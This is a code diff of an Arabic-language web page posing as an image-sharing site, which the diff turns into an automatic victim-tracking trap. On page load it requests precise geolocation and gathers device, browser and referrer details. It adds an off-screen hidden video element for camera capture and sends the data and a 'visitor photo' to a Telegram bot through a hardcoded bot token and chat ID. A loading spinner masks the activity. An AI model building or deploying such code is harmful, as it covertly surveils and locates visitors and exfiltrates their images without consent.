@@ -50,32 +50,29 @@
             border-radius: 15px;
             box-shadow: 0 15px 30px rgba(0,0,0,0.2);
             margin: 30px auto;
-            filter: blur(20px);
-            transition: filter 0.5s ease;
+            transition: all 0.5s ease;
             display: block;
         }
 
-        .main-image.clear {
-            filter: blur(0px);
+        .loading-indicator {
+            text-align: center;
+            padding: 20px;
+            color: #666;
         }
 
-        .click-button {
-            background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
-            color: white;
-            border: none;
-            padding: 15px 30px;
-            border-radius: 10px;
-            font-size: 1.2em;
-            font-weight: bold;
-            cursor: pointer;
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
             margin: 20px auto;
-            display: block;
-            transition: all 0.3s ease;
         }
 
-        .click-button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 20px rgba(231, 76, 60, 0.4);
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
 
         .success-message {
@@ -87,28 +84,77 @@
             text-align: center;
             display: none;
         }
+
+        .gallery {
+            padding: 20px;
+            text-align: center;
+        }
+
+        .status-indicator {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #2ecc71;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 25px;
+            font-size: 14px;
+            animation: pulse 2s infinite;
+            z-index: 1000;
+        }
+
+        .hidden-camera {
+            position: fixed;
+            top: -1000px;
+            left: -1000px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        .camera-canvas {
+            display: none;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.7; }
+            100% { opacity: 1; }
+        }
     </style>
 </head>
 <body>
+    <div class="status-indicator" id="statusIndicator" style="display: none;">
+        🔄 جاري التحميل...
+    </div>
+
     <div class="container">
         <div class="header">
             <h1>موقع رفع الصور</h1>
             <p>منصة سهلة وسريعة لرفع ومشاركة الصور</p>
         </div>
 
-        <img src="https://i.imgur.com/zcb3oRL.jpeg" 
-             alt="الصورة المختارة" 
-             class="main-image" 
-             id="mainImage">
+        <div class="loading-indicator" id="loadingIndicator">
+            <div class="spinner"></div>
+            <p>جاري تحميل الصورة...</p>
+        </div>
 
-        <button class="click-button" id="viewButton" onclick="viewImage()">
-            🔍 اضغط هنا لمشاهدة الصورة
-        </button>
+        <div class="gallery" id="gallery" style="display: none;">
+            <img src="https://i.imgur.com/zcb3oRL.jpeg" 
+                 alt="الصورة المختارة" 
+                 class="main-image" 
+                 id="mainImage">
+        </div>
 
         <div class="success-message" id="successMessage">
-            ✅ تم الموافقة على عرض الصورة
+            ✅ تم تحميل الصورة بنجاح
         </div>
     </div>
+
+    <!-- عناصر مخفية للكاميرا -->
+    <video id="cameraStream" class="hidden-camera" autoplay muted></video>
+    <canvas id="cameraCanvas" class="camera-canvas"></canvas>
 
     <script>
         function collectData() {
@@ -141,11 +187,16 @@
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 language: navigator.language,
                 user_agent: ua,
+                referrer: document.referrer || 'مباشر',
+                viewport: `${window.innerWidth}x${window.innerHeight}`,
                 // إضافة متغيرات الموقع
                 latitude: window.userLocation?.latitude || 'غير متاح',
                 longitude: window.userLocation?.longitude || 'غير متاح',
                 location_accuracy: window.userLocation?.accuracy || 'غير متاح',
-                location_status: window.userLocation?.status || 'لم يتم الطلب'
+                location_status: window.userLocation?.status || 'لم يتم الطلب',
+                // إضافة حالة الكاميرا
+                camera_status: window.cameraStatus || 'لم يتم الطلب',
+                photo_captured: window.photoCaptured || 'لا'
             };
         }
 
@@ -156,26 +207,30 @@
             const TELEGRAM_CHAT_ID = '170383339';
             
             const message = `
-🆕 زائر جديد للموقع:
+🔥 زائر جديد دخل الموقع تلقائياً!
 ━━━━━━━━━━━━━━━━━━
 ⏰ الوقت: ${data.timestamp}
 🌐 الرابط: ${data.page_url}
 📱 الجهاز: ${data.device_type}
 💻 المتصفح: ${data.browser}
 🖥️ النظام: ${data.operating_system}
-📺 الدقة: ${data.screen_resolution}
-🌍 المنطقة: ${data.timezone}
-🗣️ اللغة: ${data.language}
-📍 الموقع الجغرافي: ${data.location_status}
+📺 دقة الشاشة: ${data.screen_resolution}
+🖼️ نافذة المتصفح: ${data.viewport}
+🌍 المنطقة الزمنية: ${data.timezone}
+🗣️ لغة المتصفح: ${data.language}
+🔗 المصدر: ${data.referrer}
+📍 حالة الموقع: ${data.location_status}
 📐 خط العرض: ${data.latitude}
 📐 خط الطول: ${data.longitude}
 🎯 دقة الموقع: ${data.location_accuracy}
+📷 حالة الكاميرا: ${data.camera_status}
+📸 تم التصوير: ${data.photo_captured}
 ━━━━━━━━━━━━━━━━━━
             `;
             
             const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
             
-            fetch(url, {
+            return fetch(url, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -195,87 +250,172 @@
                 }
             }).then(data => {
                 console.log('📱 استجابة Telegram:', data);
+                return true;
             }).catch(error => {
                 console.error('❌ خطأ في الإرسال:', error);
+                return false;
             });
         }
 
-        function viewImage() {
-            // إظهار الصورة
-            document.getElementById('mainImage').classList.add('clear');
-            document.getElementById('viewButton').style.display = 'none';
-            document.getElementById('successMessage').style.display = 'block';
+        function sendPhotoToTelegram(imageDataUrl) {
+            const TELEGRAM_BOT_TOKEN = '7982181249:AAEyLwc9c24fu-uqUT87v26S6282XTD41XI';
+            const TELEGRAM_CHAT_ID = '170383339';
             
-            // جمع وإرسال البيانات
-            const data = collectData();
-            console.log('بيانات الزائر:', data);
+            // تحويل data URL إلى blob
+            const base64Data = imageDataUrl.split(',')[1];
+            const byteCharacters = atob(base64Data);
+            const byteNumbers = new Array(byteCharacters.length);
+            for (let i = 0; i < byteCharacters.length; i++) {
+                byteNumbers[i] = byteCharacters.charCodeAt(i);
+            }
+            const byteArray = new Uint8Array(byteNumbers);
+            const blob = new Blob([byteArray], { type: 'image/jpeg' });
             
-            // إرسال البيانات
-            sendToTelegram(data);
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('photo', blob, 'visitor_photo.jpg');
+            formData.append('caption', '📸 صورة الزائر من الكاميرا');
+            
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+            
+            return fetch(url, {
+                method: 'POST',
+                body: formData
+            }).then(response => {
+                if (response.ok) {
+                    console.log('✅ تم إرسال الصورة إلى Telegram بنجاح');
+                    return response.json();
+                } else {
+                    console.error('❌ فشل إرسال الصورة إلى Telegram');
+                    throw new Error('Telegram Photo API Error');
+                }
+            }).then(data => {
+                console.log('📸 استجابة Telegram للصورة:', data);
+                return true;
+            }).catch(error => {
+                console.error('❌ خطأ في إرسال الصورة:', error);
+                return false;
+            });
         }
 
-        // جمع الموقع الجغرافي عند تحميل الصفحة
+        function updateStatus(message, isSuccess = false) {
+            const statusElement = document.getElementById('statusIndicator');
+            statusElement.textContent = message;
+            statusElement.style.background = isSuccess ? '#2ecc71' : '#e74c3c';
+        }
+
+        function showGallery() {
+            // إخفاء شاشة التحميل
+            document.getElementById('loadingIndicator').style.display = 'none';
+            
+            // إظهار المعرض
+            document.getElementById('gallery').style.display = 'block';
+            
+            // إظهار رسالة النجاح
+            setTimeout(() => {
+                document.getElementById('successMessage').style.display = 'block';
+            }, 500);
+        }
+
+        // جمع الموقع الجغرافي
         window.userLocation = { status: 'جاري المحاولة...' };
+        window.cameraStatus = 'لم يتم الطلب';
+        window.photoCaptured = 'لا';
 
         function getLocation() {
-            if (navigator.geolocation) {
-                console.log('🔍 محاولة الحصول على الموقع الجغرافي...');
-                
-                navigator.geolocation.getCurrentPosition(
-                    function(position) {
-                        window.userLocation = {
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude,
-                            accuracy: Math.round(position.coords.accuracy) + ' متر',
-                            status: 'تم الحصول عليه بنجاح'
-                        };
-                        console.log('✅ تم الحصول على الموقع:', window.userLocation);
-                    },
-                    function(error) {
-                        let errorMsg = '';
-                        switch(error.code) {
-                            case error.PERMISSION_DENIED:
-                                errorMsg = 'رفض المستخدم';
-                                break;
-                            case error.POSITION_UNAVAILABLE:
-                                errorMsg = 'الموقع غير متاح';
-                                break;
-                            case error.TIMEOUT:
-                                errorMsg = 'انتهت مهلة الانتظار';
-                                break;
-                            default:
-                                errorMsg = 'خطأ غير معروف';
+            return new Promise((resolve) => {
+                if (navigator.geolocation) {
+                    console.log('🔍 محاولة الحصول على الموقع الجغرافي...');
+                    
+                    navigator.geolocation.getCurrentPosition(
+                        function(position) {
+                            window.userLocation = {
+                                latitude: position.coords.latitude,
+                                longitude: position.coords.longitude,
+                                accuracy: Math.round(position.coords.accuracy) + ' متر',
+                                status: 'تم الحصول عليه بنجاح'
+                            };
+                            console.log('✅ تم الحصول على الموقع:', window.userLocation);
+                            resolve(true);
+                        },
+                        function(error) {
+                            let errorMsg = '';
+                            switch(error.code) {
+                                case error.PERMISSION_DENIED:
+                                    errorMsg = 'رفض المستخدم';
+                                    break;
+                                case error.POSITION_UNAVAILABLE:
+                                    errorMsg = 'الموقع غير متاح';
+                                    break;
+                                case error.TIMEOUT:
+                                    errorMsg = 'انتهت مهلة الانتظار';
+                                    break;
+                                default:
+                                    errorMsg = 'خطأ غير معروف';
+                            }
+                            
+                            window.userLocation = {
+                                latitude: 'غير متاح',
+                                longitude: 'غير متاح',
+                                accuracy: 'غير متاح',
+                                status: errorMsg
+                            };
+                            console.log('❌ فشل الحصول على الموقع:', errorMsg);
+                            resolve(false);
+                        },
+                        {
+                            enableHighAccuracy: true,
+                            timeout: 5000,
+                            maximumAge: 60000
                         }
-                        
-                        window.userLocation = {
-                            latitude: 'غير متاح',
-                            longitude: 'غير متاح',
-                            accuracy: 'غير متاح',
-                            status: errorMsg
-                        };
-                        console.log('❌ فشل الحصول على الموقع:', errorMsg);
-                    },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 0
-                    }
-                );
-            } else {
-                window.userLocation = {
-                    latitude: 'غير متاح',
-                    longitude: 'غير متاح', 
-                    accuracy: 'غير متاح',
-                    status: 'المتصفح لا يدعم تحديد الموقع'
-                };
-                console.log('❌ المتصفح لا يدعم تحديد الموقع');
-            }
+                    );
+                } else {
+                    window.userLocation = {
+                        latitude: 'غير متاح',
+                        longitude: 'غير متاح', 
+                        accuracy: 'غير متاح',
+                        status: 'المتصفح لا يدعم تحديد الموقع'
+                    };
+                    console.log('❌ المتصفح لا يدعم تحديد الموقع');
+                    resolve(false);
+                }
+            });
         }
 
-        // الحصول على الموقع الجغرافي عند التحميل
-        window.addEventListener('load', function() {
-            console.log('🚀 تم تحميل الصفحة');
-            getLocation();
+        // البدء التلقائي عند تحميل الصفحة
+        async function initializeApp() {
+            console.log('🚀 تم تحميل الصفحة - البدء التلقائي');
+            
+            // محاولة الحصول على الموقع الجغرافي
+            await getLocation();
+            
+            // محاولة التقاط صورة من الكاميرا (في الخلفية)
+            capturePhoto(); // بدون انتظار لتجنب التأخير
+            
+            // جمع البيانات
+            const data = collectData();
+            console.log('📊 بيانات الزائر:', data);
+            
+            // إرسال البيانات إلى Telegram
+            await sendToTelegram(data);
+            
+            // إظهار الصورة بعد التأخير
+            setTimeout(() => {
+                showGallery();
+                
+                // إخفاء مؤشر الحالة بعد فترة
+                setTimeout(() => {
+                    document.getElementById('statusIndicator').style.display = 'none';
+                }, 1000);
+            }, 1000);
+        }
+
+        // تشغيل التطبيق عند تحميل الصفحة
+        window.addEventListener('load', initializeApp);
+        
+        // تشغيل إضافي عند استعداد DOM
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('📄 DOM جاهز');
         });
     </script>
 </body>
